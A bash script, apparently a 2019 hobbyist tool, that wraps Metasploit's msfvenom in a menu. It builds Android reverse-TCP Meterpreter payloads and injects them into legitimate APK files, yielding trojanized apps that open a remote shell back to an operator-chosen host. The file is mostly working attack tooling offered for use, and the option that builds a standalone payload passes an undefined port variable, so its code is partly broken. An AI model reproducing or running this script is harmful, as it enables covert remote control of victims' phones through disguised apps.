#!/bin/bash
clear
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install
#This Script Can Helps U embed payload with any apk
#Created 29/03/2019  4:56 pm
#CopyRight by Saeed Ahmeed ====> Zoal Ktoom

echo ""
echo -e "$red"
echo -e		"----------------------------------"
echo -e		"      CopyRight BY Zoal ktoom      "
echo -e		"      Version 1.0.0                "
echo -e		" PLEASE MAKE SURE THAT THE CURRENT "
echo -e		" PATH CONTAINS METASPLOIT FRAMEWOTK"
echo -e		"----------------------------------\n"
echo -e "$cyan"
echo "Select option ====||
		  ||
		  ++
		 \  /"
echo -e "$blue"
echo -e		"1. Embed Payload	2. Create Payload"
echo ""
echo -e		"3. Launch msfconsole		4. Exit"
echo ""
echo -e "$purple"
read -p "Please Choice >|" o
if [ $o = "3" ]
then
msfconsole
break
elif [ $o = "1" ]
then
echo "Enter HOST"
read -p ">|" host
echo "Enter PORT"
read -p ">|" port
echo -e "$green Please enter the complete path with .apk extension that you want to embed with"
read -p ">|" p1
echo -e "$green Please enter the complete path with .apk extension where you want to save the embedded apk to"
read -p ">|" p4
msfvenom -x $p1 -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $p4
elif [ $o = "2" ]
then
echo "Enter HOST"
read -p ">|" host1
echo "Enter PORT"
read -p ">|" port
echo -e "$yellow Please enter the complete path with .apk extension"
echo -e "$yellow where you want to save the payload to"
read -p ">|" p2
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host1 LPORT=$port1 R > $p2
elif [ $o = "4" ]
then
echo -e " Thanks For Usage "
exit
else
echo "Wrong choice. Please try again"
fi

